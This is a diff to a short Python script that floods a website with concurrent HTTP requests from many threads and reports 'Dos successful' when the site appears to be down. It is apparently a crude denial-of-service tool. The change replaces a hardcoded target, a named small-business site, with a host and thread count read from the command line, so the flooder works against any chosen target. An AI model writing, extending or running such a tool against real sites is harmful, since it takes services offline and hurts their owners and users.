@@ -1,6 +1,7 @@
 import requests
 import threading
 import time
+import sys
 l = []
 rl = []
 
@@ -37,7 +38,7 @@ def make_request(thread_id):
         count_req_per_sec()
         try:
             s = current_mil_time()
-            r = requests.get('https://suryaseafoods.tiiny.site/')
+            r = requests.get(f'https://{sys.argv[1]}/')
             t = current_mil_time() - s
             print(f"Response code from thread {thread_id}: {r.status_code}")
             count_resp_per_sec(t)
@@ -45,7 +46,7 @@ def make_request(thread_id):
             message = "Dos successful. site looks down for now."
 
 if __name__ == "__main__":
-    threads = 32
+    threads = int(sys.argv[2])
     while threads >= 1:
         x = threading.Thread(target=make_request, args=(threads,), daemon=True)
         print(f"Thread ID: {threads}")
